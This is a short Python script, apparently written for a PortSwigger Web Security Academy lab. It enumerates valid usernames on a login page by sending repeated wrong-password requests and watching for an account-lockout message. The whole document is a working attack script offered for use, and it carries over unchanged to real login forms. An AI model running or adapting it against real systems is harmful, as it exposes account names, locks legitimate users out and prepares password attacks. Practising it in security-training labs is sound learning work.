import requests
import time

url = "<https://0aac009003898ff3805b081200c70062.web-security-academy.net/login>"

with open("usernames.txt") as f:
    usernames = [line.strip() for line in f if line.strip()]

print("[*] Starting username enumeration...\n")

for user in usernames:
    for i in range(7):  # try 7 times
        data = {"username": user, "password": "wrongpass"}
        r = requests.post(url, data=data)

        if "too many incorrect" in r.text.lower():
            print(f"\n[+] VALID USERNAME FOUND → {user}")
            exit()

        time.sleep(0.4)

    print(f"[-] {user}")

print("\n[*] Finished - no lock message found")
